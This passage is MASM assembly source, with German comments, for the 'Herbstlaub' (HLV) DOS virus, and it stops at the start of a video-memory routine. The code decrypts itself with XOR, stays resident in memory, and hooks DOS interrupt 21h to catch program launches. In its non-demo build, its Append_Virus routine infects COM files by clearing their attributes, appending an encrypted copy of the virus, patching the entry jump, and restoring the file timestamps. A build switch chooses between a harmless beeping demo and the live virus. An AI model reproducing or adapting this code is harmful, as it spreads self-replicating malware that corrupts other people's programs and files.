PAGE 62,132
TITLE	_HLV_ (- Microsoft MASM 5.1 source -)
SUBTTL	(C) 1990 164A12565AA18213165556D3125C4B962712
.RADIX	16
.LALL

TRUE		EQU	1
FALSE		EQU	0

MONTH		EQU	9D
YEAR		EQU	1991D

DEMO		EQU	TRUE

SWITCHABLE	=	TRUE
IFDEF		_NOSWITCH
SWITCHABLE	=	FALSE
ENDIF

comment 	#
имммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╩
╨									       ╨
╨                            =====================   			       ╨
╨	                      H E R B S T L A U B     			       ╨
╨                            =====================			       ╨
╨									       ╨
╨									       ╨
╨	SPRACHE:	MASM 4.00 (+)   [ fr│here Versionen brechen z.B. mit   ╨
╨					*OUT OF MEMORY* (3.00) ab oder lassen  ╨
╨					sogar den PC abst│rzen (1.10) ]        ╨
╨									       ╨
╨	( Eine als Beispiel gedachte Batchdatei zur Steuerung der  bersetzung  ╨
╨	ist am Ende dieses Quelltextes als Kommentar hinzugef│gt. )            ╨
╨									       ╨
хмммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╪
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	W└hrend der  bersetzung zu auszugebende Meldungen, 1. Teil.            Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
#
IF1
REPT	50
%Out
ENDM;
%Out	имммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╩
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟зддддддддддддддддддддддд©╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟ддддддддддддддддд╢  H E R B S T L A U B  цдддддддддддддддддд╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟юддддддддддддддддддддддды╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDIF
comment #
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Einige Assembler - Makros.      				       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
#							;
MSDOS		MACRO					;
			INT	21			;
		ENDM					;
Wait_HRI_or_VRI MACRO					;
		LOCAL	_X_1, _X_2, _X_3		;
		MOV	DX,03DA 			;
		CLI					;
	  _X_1: IN	AL,DX				;
		TEST	AL,08				;
		JNZ	_X_3				;
		TEST	AL,01				;
		JNZ	_X_1				;
	  _X_2: IN	AL,DX				;
		TEST	AL,01				;
		JZ	_X_2				;
	  _X_3	LABEL	NEAR				;
		ENDM					;------;
SAVE		MACRO	  _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c  ;
		 IRP  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c> ;
		  IFNB	 <_X>				;------;
		   IFIDN <_X>,<F>			;
			PUSHF				;
		   ELSE 				;
			PUSH	_X			;
		   ENDIF				;
		  ENDIF 				;
		 ENDM					;
		ENDM					;------;
REST		MACRO	  _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c  ;
		 IRP  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c> ;
		  IFNB	 <_X>				;------;
		   IFIDN <_X>,<F>			;
			POPF				;
		   ELSE 				;
			POP	_X			;
		   ENDIF				;
		  ENDIF 				;
		 ENDM					;
		ENDM					;
MOV_S		MACRO	S1,S2				;
			PUSH	S2			;
			POP	S1			;
		ENDM					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Start des Code-Segments, Segment Prefix Bytes werden  n i c h t  au-   Ё
Ё	tomatisch durch den Assembler erzeugt.				       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
TEXT		SEGMENT 				;
		ASSUME	CS:TEXT,DS:TEXT,ES:TEXT,SS:TEXT ;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Einige das Verst└ndnis erleichternde Definitionen.      	       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
NearJmp 	EQU	0E9				;
PORT_B_8259A	EQU	20				;
EOI_8259A	EQU	20				;
PORT_B_8255	EQU	61				;
FIRSTCONST	EQU	0131				;
FIRSTBASE	EQU	FIRSTCONST  - OFFSET XI_001	;-----;
FIRSTBASE2	EQU	(FIRSTCONST + OFFSET XI_005 - XI_001) ;
DeCrptd 	EQU	0				;-----;
EnCrptd 	EQU	1				;
BIOSDATASEG	EQU	040				;
MonoBase	EQU	0B000				;
ColorBase	EQU	0B800				;
B_VIDPAGE	EQU	THIS WORD + 04E 		;
B_TIMERVAR	EQU	THIS WORD + 06C 		;
TimerInt	EQU	1C				;
DOS		EQU	21				;
DOS_multi	EQU	2F				;
MS_SetDTA	EQU	1A				;
  DTA_in_PSP	EQU	80				;
MS_SetInt	EQU	25				;
MS_GetDateTime	EQU	2A				;
MS_GetVer	EQU	30				;
  DOS_v_02	EQU	2				;
MS_GetInt	EQU	35				;
MS_Open 	EQU	3Dh				;
  Read_Only	EQU	0				;
  Read_Write	EQU	2				;
MS_Close	EQU	3E				;
MS_Read 	EQU	3F				;
MS_Write	EQU	40				;
MS_MoveFP	EQU	42				;
  OfsFrmTop	EQU	0				;
  OfsFrmEnd	EQU	02				;
MS_GetFileAttr	EQU	4300				;
MS_SetFileAttr	EQU	4301				;
  Attr_A	EQU	20				;
  Attr_SHR	EQU	7				;
  Attr_ASHR	EQU	Attr_A OR Attr_SHR		;
MS_AllocMem	EQU	48				;
MS_ReleaseMem	EQU	49				;
  MemCBsig	EQU	THIS BYTE + 0			;
  MemCBowned	EQU	THIS WORD + 1			;
  MemCBsize	EQU	THIS WORD + 3			;
MS_Exec 	EQU	4Bh				;
  MS_Exec_SF0	EQU	0				;
  Virus_fun	EQU	0ffh				;
  Virus_Sig	EQU	55AA				;
MS_SetPSP	EQU	50				;
  PSPsize	EQU	00100				;
  PSPCurCom	EQU	THIS WORD + 016 		;
  PSPEnv	EQU	THIS WORD + 02C 		;
  PSP_SegJFB	EQU	THIS WORD + 036 		;
  NoEnv 	EQU	0				;
MS_GetFileDate	EQU	5700				;
MS_SetFileDate	EQU	5701				;
PSP_100 	EQU	THIS WORD + PSPsize		;
PSP_102 	EQU	THIS BYTE + PSPsize + 2 	;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Ab hier wird Objektcode erzeugt, Datenbereich Nr. 1.    	       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Crypt1		DB	0				;
Crypt2		EQU	OFFSET Crypt1 + FIRSTBASE	;
Crypt3		EQU	Crypt1 + PSPsize		;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Einsprungstelle, entschl│sseln des Virus falls notwendig.              Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
XI_000: 	CLI					;
		MOV	BP,SP				;
		CALL	XI_001				;
XI_001: 	POP	BX				;
		SUB	BX,FIRSTCONST			;
		TEST	BYTE PTR CS:[BX+Crypt2],EnCrptd ;
		JZ	XI_003				;
		LEA	SI,[BX + XR_000]		;
		MOV	SP,OFFSET EOFC-OFFSET XI_003	;
XI_002: 	XOR	[SI],SI 			;
		XOR	[SI],SP 			;
		INC	SI				;
		DEC	SP				;
		JNZ	XI_002				;
XI_003		LABEL	NEAR				;
    XR_000	EQU	OFFSET XI_003 + FIRSTBASE	;
    XR_001	EQU	XI_003 + PSPsize		;
		MOV	SP,BP				;
		JMP	SHORT XI_004			;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Datenbereich 2. 						       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
    XD_000	DW	PSPsize 			;
Disp_to_com_1	EQU	OFFSET XD_000 + FIRSTBASE	;
    XD_001	DW	9090				;
Disp_to_com_2	EQU	OFFSET XD_001 + FIRSTBASE	;
    XD_002	DW	9090				;
Initial_AX	EQU	OFFSET XD_002 + FIRSTBASE	;
    XD_003	EQU	THIS WORD			;
    XD_004	EQU	THIS BYTE + 2			;
		NOP					;
		NOP					;
		NOP					;
Org1stInstr_s1	EQU	OFFSET XD_003 + FIRSTBASE	;
Org1stInstr_t1	EQU	XD_003 + PSPsize		;
Org1stInstr_t2	EQU	XD_003 + PSPsize + 1		;
Org1stInstr_s2	EQU	OFFSET XD_004 + FIRSTBASE	;
    XD_005	DW	2 dup ( 9090 )			;
Org_Int_1C	EQU	XD_005 + PSPsize		;
    XD_006	DW	2 dup ( 9090 )			;
Org_int_21s	EQU	OFFSET XD_006 + FIRSTBASE	;
Org_Int_21t	EQU	XD_006 + PSPsize		;
							;
IF SWITCHABLE						;
							;
    XD_007	DW	2 dup ( 9090 )			;
Org_Int_2F	EQU	XD_007 + PSPsize		;
    XD_008	DB	5, "_HLV_    "			;
Cmd_2F		EQU	XD_008 + PSPsize		;
    XD_009	DB	'HLV is on',0Dh,0Ah,'$' 	;
Msg_On		EQU	XD_009 + PSPsize		;
    XD_010	DB	'HLV is off',0Dh,0Ah,'$'	;
Msg_Off 	EQU	XD_010 + PSPsize		;
							;
ENDIF							;
							;
    XD_011	DW	9090				;
File_Attributes EQU	XD_011 + PSPsize		;
    XD_012	DW	9090				;
File_Date	EQU	XD_012 + PSPsize		;
    XD_013	DW	9090				;
File_Time	EQU	XD_013 + PSPsize		;
    XD_014	DW	2 dup ( 9090 )			;
Pathname	EQU	XD_014 + PSPsize		;
    XD_015	DW	2 dup ( 9090 )			;
File_Size_lsb	EQU	XD_015 + PSPsize		;
File_Size_msb	EQU	XD_015 + PSPsize + 2		;
    XD_016	DB	NearJmp 			;
FirstOpCode_1	EQU	XD_016 + PSPsize		;
    XD_017	DW	9090				;
FirstOpCode_2	EQU	XD_017 + PSPsize		;
    XD_018	DB	90				;
Num_of_Col	EQU	XD_018 + PSPsize		;
    XD_019	DB	90				;
Last_Line	EQU	XD_019 + PSPsize		;
    XD_020	DB	90				;
Prevent_Snow?	EQU	XD_020 + PSPsize		;
Last_Pair	EQU	THIS WORD + PSPsize		;
    XD_021	DB	90				;
    XD_022	DB	90				;
Last_Char	EQU	XD_021 + PSPsize		;
Last_Attr	EQU	XD_022 + PSPsize		;
RecTyp1 RECORD	ExtCom:1, Recf_1:1, R_in_1c:1		;
    XD_023	RecTyp1 <0,0,0> 			;
ISR_Flags	EQU	XD_023 + PSPsize		;
    XD_024	DW	9090				;
Seg_of_VRAM	EQU	XD_024 + PSPsize		;
    XD_025	DW	9090				;
Page_offset	EQU	XD_025 + PSPsize		;
    XD_026	DW	9090				;
Speed		EQU	XD_026 + PSPsize		;
    XD_027	DW	9090				;
XR_002 EQU	XD_027 + PSPsize			;
    XD_028	DW	9090				;
XR_003 EQU	XD_028 + PSPsize			;
    XD_029	DW	9090				;
Num_of_char	EQU	XD_029 + PSPsize		;
    XD_030	DW	9090				;
XR_004 EQU	XD_030 + PSPsize			;
    XD_031	DW	7 dup ( 9090 )			;
FirstRandom	EQU	XD_031 + PSPsize		;
LastRandom	EQU	This Word + PSPsize		;
		DW	9090				;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Installieren u. relozieren falls notwendig.     		       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
XI_004: 	CALL	XI_005				;
XI_005		LABEL	NEAR				;
XR_005		EQU	XI_005 + PSPsize		;
		POP	BX				;
		SUB	BX,FIRSTBASE2			;
		MOV	CS:[BX+Disp_to_com_2],CS	;
		MOV	CS:[BX+Initial_AX],AX		;
		MOV	AX,CS:[BX+Org1stInstr_s1]	;
		MOV	[PSP_100],AX			;
		MOV	AL,CS:[BX+Org1stInstr_s2]	;
		MOV	[PSP_102],AL			;
		PUSH	BX				;
		MOV	AH,MS_GetVer			;
		MSDOS					;
		POP	BX				;
		CMP	AL,DOS_v_02			;
		JB	XI_006				;
		MOV	AX,MS_Exec * 100 + Virus_fun	;
		XOR	DI,DI				;
		XOR	SI,SI				;
		MSDOS					;
		CMP	DI,Virus_sig			;
		JNZ	XI_007				;
XI_006: 	STI					;
		MOV_S	ES,DS				;
		MOV	AX,CS:[BX+Initial_AX]		;
		JMP	DWORD PTR CS:[BX+Disp_to_com_1] ;
XI_007: 	PUSH	BX				;
		MOV	AX,MS_GetInt * 100 + DOS	;
		MSDOS					;
		MOV	AX,BX				;
		POP	BX				;
		MOV	CS:[BX+Org_int_21s],AX		;
		MOV	CS:[BX+Org_int_21s + 2],ES	;------------;
		MOV	AX, (OFFSET EOFC - OFFSET Crypt1) SHR 4 + 11 ;
		MOV	BP,CS				;------------;
		DEC	BP				;
		MOV	ES,BP				;
		MOV	SI,CS:[PSPCurCom]		;
		MOV	ES:[MemCBowned],SI		;
		MOV	DX,ES:[MemCBsize]		;
		MOV	ES:[MemCBsize],AX		;
		MOV	ES:[MemCBsig],'M'		;
		SUB	DX,AX				;
		DEC	DX				;
		INC	BP				;
		ADD	BP,AX				;
		INC	BP				;
		MOV	ES,BP				;
		PUSH	BX				;
		MOV	AH,MS_SetPSP			;
		MOV	BX,BP				;
		MSDOS					;
		POP	BX				;
		XOR	DI,DI				;
		MOV_S	SS,ES				;
		PUSH	DI				;
		LEA	DI,[BX+XR_010]			;
		MOV	SI,DI				;
		MOV	CX,OFFSET EOFC			;
		STD					;
		REPZ	MOVSB				;
		PUSH	ES				;
		LEA	CX,[BX+XR_006]			;
		PUSH	CX				;
		RETF					;
XI_008		LABEL	NEAR				;
XR_006		EQU	OFFSET XI_008 + FIRSTBASE	;
		MOV	CS:[BX+Disp_to_com_2],CS	;
		LEA	CX,[BX+Crypt2]			;
		REPZ	MOVSB				;
		MOV	CS:[PSP_SegJFB],CS		;
		DEC	BP				;
		MOV	ES,BP				;
		MOV	ES:[MemCBsize],DX		;
		MOV	ES:[MemCBsig],'Z'		;
		MOV	ES:[MemCBowned],CS		;
		INC	BP				;
		MOV	ES,BP				;
		MOV_S	ES,DS				;
		MOV_S	DS,CS				;
		LEA	SI,[BX+Crypt2]			;
		MOV	DI,PSPsize			;
		MOV	CX,OFFSET EOFC			;
		CLD					;
		REPZ	MOVSB				;
		PUSH	ES				;
		LEA	AX,[XR_007]			;
		PUSH	AX				;
		RETF					;
XI_009		LABEL	NEAR				;
XR_007		EQU	XI_009 + PSPsize		;
		MOV	CS:[PSPEnv],NoEnv		;
		MOV	CS:[PSPCurCom],CS		;
		PUSH	DS				;
		LEA	DX,[XR_008]			;
		MOV_S	DS,CS				;
		MOV	AX,MS_SetInt * 100 + DOS	;
		MSDOS					;
		POP	DS				;
		MOV	AH,MS_SetDTA			;
		MOV	DX,DTA_in_PSP			;
		MSDOS					;
		SAVE	DS,ES,SI,DI,CX			;
		MOV_S	ES,CS				;
		MOV	CX,BIOSDATASEG			;
		MOV	DS,CX				;
		MOV	DI,OFFSET FirstRandom		;
		MOV	SI,OFFSET B_TIMERVAR		;
		MOV	CL,8				;
		CLD					;
		REPZ	MOVSW				;
		REST	CX,DI,SI,ES,DS			;
							;
IF SWITCHABLE						;
							;
		PUSH	DS				;
		MOV	AX,MS_GetInt * 100 + DOS_multi	;
		MSDOS					;
		MOV	CS:[Org_Int_2F],BX		;
		MOV	CS:[Org_Int_2F + 2],ES		;
		MOV	AX,MS_SetInt * 100 + DOS_multi	;
		MOV	DX,offset Int_2F_ISR		;
		MOV_S	DS,CS				;
		MSDOS					;
		POP	DS				;
							;
ENDIF							;
							;
		OR	CS:[ISR_Flags],MASK ExtCom	;
		MOV	AH,MS_GetDateTime		;
		MSDOS					;
		CMP	CX,YEAR 			;
		JZ	XI_010				;
		JMP	SHORT XI_011			;
XI_010: 	CMP	DH,MONTH			;
		JB	XI_011				;
		AND	CS:[ISR_Flags],NOT MASK ExtCom	;
XI_011: 	MOV	AX,1518 			;
		CALL	Random				;
		INC	AX				;
		MOV	CS:[XR_002],AX			;
		MOV	CS:[XR_003],AX			;
		MOV	CS:[XR_004],1			;
		MOV	AX,MS_GetInt * 100 + TimerInt	;
		MSDOS					;
		MOV	CS:[Org_Int_1C],BX		;
		MOV	CS:[Org_Int_1C + 2],ES		;
		PUSH	DS				;
		MOV	AX,MS_SetInt * 100 + TimerInt	;
		MOV	DX,OFFSET XR_009		;
		MOV_S	DS,CS				;
		MSDOS					;
		POP	DS				;
XI_012: 	MOV	BX,OFFSET XR_005 - (FIRSTBASE2) ;
		JMP	XI_006				;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Neue Interrupt 21(h) Behandlungsroutine ( ver└ndert Exec - Funktion ). Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
XI_013		LABEL	NEAR				;
XR_008		EQU	XI_013 + PSPsize		;
		CMP	AH,MS_Exec			;
		JZ	XI_016				;
XI_014: 	JMP	DWORD PTR CS:[Org_Int_21t]	;
XI_015: 	MOV	DI,Virus_Sig			;
		LES	AX,CS:DWORD PTR [Org_Int_21t]	;
		MOV	DX,CS				;
		IRET					;
XI_016: 	CMP	AL,Virus_fun			;
		JZ	XI_015				;
		CMP	AL,MS_Exec_SF0			;
		JNZ	XI_014				;
		SAVE	F,AX,BX,CX,DX,SI,DI,BP,ES,DS	;
		MOV	CS:[Pathname],DX		;
		MOV	CS:[Pathname + 2],DS		;
		MOV_S	ES,CS				;
		MOV	AX,MS_Open * 100 + Read_Only	;
		MSDOS					;
		JB	XI_018				;
		MOV	BX,AX				;
		MOV	AX,MS_GetFileDate		;
		MSDOS					;
		MOV	CS:[File_Date],DX		;
		MOV	CS:[File_Time],CX		;
		MOV	AH,MS_Read			;
		MOV_S	DS,CS				;
		MOV	DX,OFFSET Org1stInstr_t1	;
		MOV	CX,3				;
		MSDOS					;
		JB	XI_018				;
		CMP	AX,CX				;
		JNZ	XI_018				;
		MOV	AX,MS_MoveFP * 100 + OfsFrmEnd	;
		XOR	CX,CX				;
		XOR	DX,DX				;
		MSDOS					;
		MOV	CS:[File_Size_lsb],AX		;
		MOV	CS:[File_Size_msb],DX		;
		MOV	AH,MS_Close			;
		MSDOS					;---------------;
		CMP	CS:[Org1stInstr_t1], 'Z' * 100 + 'M'		;
		JNZ	XI_017						;
		JMP	XI_025						;
XI_017: 	CMP	CS:[File_Size_msb],+0				;
		JA	XI_018						;
		CMP	CS:[File_Size_lsb],offset Crypt1-offset EOFC-20 ;
		JBE	XI_019						;
XI_018: 	JMP	XI_025						;
XI_019: 	CMP	BYTE PTR CS:[Org1stInstr_t1],NearJmp		;
		JNZ	XI_020						;
		MOV	AX,CS:[File_Size_lsb]				;
		ADD	AX,OFFSET Crypt1 - offset EOFC - 2		;
		CMP	AX,CS:[Org1stInstr_t2]		;---------------;
		JZ	XI_018				;
							;
IF DEMO 						;
XI_020: 	CALL	DEMO_Infect			;
		JMP	XI_025				;
							;
IF2							;----------------;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟иммммммммммммммммм╩╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨ Demo - Version, ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨ k e i n  Virus. ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDIF							;----------------;
ELSE							;
IFDEF	_DANGER 					;
XI_020		MOV	AX,MS_GetFileAttr		;
		LDS	DX,CS:DWORD PTR [Pathname]	;
		MSDOS					;
		JB	XI_018				;
		MOV	CS:[File_Attributes],CX 	;
		XOR	CL,Attr_A			;
		TEST	CL,Attr_ASHR			;
		JZ	XI_021				;
		MOV	AX,MS_SetFileAttr		;
		XOR	CX,CX				;
		MSDOS					;
		JB	XI_018				;
XI_021: 	MOV	AX,MS_Open * 100 + Read_Write	;
		MSDOS					;
		JB	XI_018				;
		MOV	BX,AX				;
		MOV	AX,MS_MoveFP * 100 + OfsFrmEnd	;
		XOR	CX,CX				;
		XOR	DX,DX				;
		MSDOS					;
		CALL	Append_Virus			;
		JNB	XI_022				;
		MOV	AX,MS_MoveFP * 100 + OfsFrmTop	;
		MOV	CX,CS:[File_Size_msb]		;
		MOV	DX,CS:[File_Size_lsb]		;
		MSDOS					;
		MOV	AH,MS_Write			;
		XOR	CX,CX				;
		MSDOS					;
		JMP	SHORT XI_023			;
XI_022: 	MOV	AX,MS_MoveFP * 100 + OfsFrmTop	;
		XOR	CX,CX				;
		XOR	DX,DX				;
		MSDOS					;
		JB	XI_023				;
		MOV	AX,CS:[File_Size_lsb]		;
		ADD	AX,-2				;
		MOV	CS:[FirstOpCode_2],AX		;
		MOV	AH,MS_Write			;
		MOV	DX,OFFSET FirstOpCode_1 	;
		MOV	CX,3				;
		MSDOS					;
XI_023: 	MOV	AX,MS_SetFileDate		;
		MOV	DX,CS:[File_Date]		;
		MOV	CX,CS:[File_Time]		;
		MSDOS					;
		MOV	AH,MS_Close			;
		MSDOS					;
		MOV	CX,CS:[File_Attributes] 	;
		TEST	CL,Attr_SHR			;
		JNZ	XI_024				;
		TEST	CL,Attr_A			;
		JNZ	XI_025				;
XI_024: 	MOV	AX,MS_SetFileAttr		;
		LDS	DX,CS:DWORD PTR [Pathname]	;
		MSDOS					;
IF2							;----------------;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟иммммммммммммммммм╩╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨    KEIN DEMO,	 ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨ scharfer Virus. ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDIF									 ;
ELSE									 ;
		.ERR							 ;
ENDIF									 ;
ENDIF									 ;
IF SWITCHABLE								 ;
IF2									 ;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟иммммммммммймммммммммммммммммймммммммммм╩╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╨ Neuer interner MSDOS Befehl '_HLV_' ! ╨╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDIF									 ;
ELSE									 ;
IF2									 ;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟иммммммммммймммммммммммммммммймммммммммм╩╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╨ Kommando '_HLV_' nicht implementiert. ╨╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDIF									 ;
ENDIF									 ;
DISPNUM MACRO	nu,nuxx 						 ;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╨	(Monat - Jahr)	     nu	 -  nuxx    ╨╟╟╟╟╟╟╟╟╟╟╟╟╨
ENDM									 ;
IF2									 ;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╨	  Bis zum Jahresende aktiv ab:	    ╨╟╟╟╟╟╟╟╟╟╟╟╟╨
.radix 10								 ;
DISPNUM %MONTH,%YEAR							 ;
.radix 16								 ;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟хммммммммммммммммммммммммммммммммммммммм╪╟╟╟╟╟╟╟╟╟╟╟╟╨
endif									 ;
XI_025: 	REST	DS,ES,BP,DI,SI,DX,CX,BX,AX,F	;----------------;
		JMP	XI_014				;
IF DEMO 						;
							;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Statt APPEND in der DEMO - Version aufgerufene Prozedur.	       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
DEMO_INFECT	PROC	NEAR				;
		push	ax				;
		push	cx				;
		in	al,61				;
		or	al,3				;
		out	61,al				;
		mov	al,0b6				;
		out	43,al				;
		mov	cx,0a				;
XI_026: 	dec	cx				;
		jz	XI_030				;
XI_027: 	mov	ax,200d 			;
XI_028: 	dec	ax				;
		cmp	ax,100d 			;
		jz	XI_031				;
		push	ax				;
		out	42,al				;
		push	cx				;
		mov	cx,150d 			;
XI_029: 	nop					;
		loop	XI_029				;
		pop	cx				;
		mov	al,ah				;
		out	42,al				;
		pop	ax				;
		jmp	XI_028				;
XI_030: 	in	al,61				;
		and	al,0fc				;
		out	61,al				;
		pop	cx				;
		pop	ax				;
		ret					;
XI_031: 	inc	ax				;
		cmp	ax,600d 			;
		jz	XI_026				;
		push	ax				;
		out	42,al				;
		push	cx				;
		mov	cx,150d 			;
XI_032: 	nop					;
		loop	XI_032				;
		pop	cx				;
		mov	al,ah				;
		out	42,al				;
		pop	ax				;
		jmp	XI_031				;
DEMO_INFECT	ENDP					;
							;
ELSE							;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Append Virus - von der Int21ISR aufgerufene Infektions-Prozdur	       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Append_Virus	PROC	NEAR				;
		SAVE	ES,BX				;
		MOV	AH,MS_AllocMem			;----------;
		MOV	BX,(OFFSET EOFC - OFFSET Crypt1) SHR 4 + 1 ;
		MSDOS					;----------;
		POP	BX				;
		JNB	XI_034				;
XI_033: 	STC					;
		POP	ES				;
		RET					;
XI_034: 	MOV	CS:[Crypt3],EnCrptd		;
		MOV	ES,AX				;
		MOV_S	DS,CS				;
		XOR	DI,DI				;
		MOV	SI,PSPsize			;
		MOV	CX,OFFSET EOFC			;
		CLD					;
		REPZ	MOVSB				;
		MOV	DI,OFFSET XI_003		;
		MOV	SI,OFFSET XR_001		;
		ADD	SI,[File_Size_lsb]		;
		MOV	CX,OFFSET EOFC - OFFSET XI_003	;
XI_035: 	XOR	ES:[DI],SI			;
		XOR	ES:[DI],CX			;
		INC	DI				;
		INC	SI				;
		LOOP	XI_035				;
		MOV	DS,AX				;
		MOV	AH,MS_Write			;
		XOR	DX,DX				;
		MOV	CX,OFFSET EOFC			;
		MSDOS					;
		SAVE	F,AX				;
		MOV	AH,MS_ReleaseMem		;
		MSDOS					;
		REST	AX,F				;
		MOV_S	DS,CS				;
		JB	XI_033				;
		CMP	AX,CX				;
		JNZ	XI_033				;
		POP	ES				;
		CLC					;
		RET					;
Append_Virus	ENDP					;
							;
ENDIF							;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	'Zufallszahlen' - Generator.    				       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Random		PROC	NEAR				;
		SAVE	DS				;
		MOV_S	DS,CS				;
		SAVE	BX,CX,DX,AX			;
		MOV	CX,7				;
		MOV	BX,offset LastRandom		;
		PUSH	[BX]				;
XI_036: 	MOV	AX,[BX-02]			;
		ADC	[BX],AX 			;
		DEC	BX				;
		DEC	BX				;
		LOOP	XI_036				;
		POP	AX				;
		ADC	[BX],AX 			;
		MOV	DX,[BX] 			;
		POP	AX				;
		OR	AX,AX				;
		JZ	XI_037				;
		MUL	DX				;
XI_037: 	MOV	AX,DX				;
		REST	DX,CX,BX,DS			;
		RET					;
Random		ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Zeichen und Attribut aus Videospeicher auslesen.		       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Load_from_VRAM	PROC	NEAR				;
		SAVE	SI,DS,DX			;
		MOV	AL,DH				;
		MUL	[Num_of_Col]			;
		MOV	DH,0				;
		ADD	AX,DX				;
		SHL	AX,1				;
		ADD	AX,[Page_offset]		;
		MOV	SI,AX				;
		TEST	[Prevent_Snow?],-1		;
		MOV	DS,[Seg_of_VRAM]		;
		JZ	XI_038				;
		Wait_HRI_or_VRI 			;
XI_038: 	LODSW					;
		STI					;
		REST	DX,DS,SI			;
		RET					;
Load_from_VRAM	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Zeichen und Attribut (AX) in den Videospeicher schreiben.              Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Write_to_VRAM	PROC	NEAR				;
